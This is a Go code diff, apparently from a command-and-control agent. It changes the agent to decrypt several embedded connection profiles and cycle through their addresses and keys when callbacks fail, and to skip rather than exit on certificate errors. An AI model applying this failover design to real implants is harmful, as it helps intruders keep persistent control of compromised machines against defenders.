@@ -74,20 +74,41 @@ func CreateInfo() ([]byte, []byte) {
 	return data, randKey
 }
 
+var profiles []utils.Profile
+var encKeys [][]byte
+var profileIndex int
 var profile utils.Profile
 var AgentId uint32
 var encKey []byte
 
 func main() {
 
-	encKey = encProfile[:16]
-	encProfile = encProfile[16:]
-	encProfile, _ = utils.DecryptData(encProfile, encKey)
+	for _, encProfile := range encProfiles {
+		key := make([]byte, 16)
+		copy(key, encProfile[:16])
+		encData := encProfile[16:]
+		decData, err := utils.DecryptData(encData, key)
+		if err != nil {
+			continue
+		}
 
-	err := msgpack.Unmarshal(encProfile, &profile)
-	if err != nil {
+		var p utils.Profile
+		err = msgpack.Unmarshal(decData, &p)
+		if err != nil {
+			continue
+		}
+
+		profiles = append(profiles, p)
+		encKeys = append(encKeys, key)
+	}
+
+	if len(profiles) == 0 {
 		return
 	}
+
+	profileIndex = 0
+	profile = profiles[profileIndex]
+	encKey = encKeys[profileIndex]
 
 	sessionInfo, sessionKey := CreateInfo()
 	utils.SKey = sessionKey
@@ -108,7 +129,16 @@ func main() {
 	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
 		if i > 0 {
 			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
-			addrIndex = (addrIndex + 1) % len(profile.Addresses)
+			addrIndex++
+			if addrIndex >= len(profile.Addresses) {
+				addrIndex = 0
+				profileIndex = (profileIndex + 1) % len(profiles)
+				profile = profiles[profileIndex]
+				encKey = encKeys[profileIndex]
+				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
+				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
+				initMsg, _ = utils.EncryptData(initMsg, encKey)
+			}
 		}
 
 		///// Connect
@@ -121,7 +151,7 @@ func main() {
 		if profile.UseSSL {
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 			if certerr != nil {
-				return
+				continue
 			}
 
 			caCertPool := x509.NewCertPool()
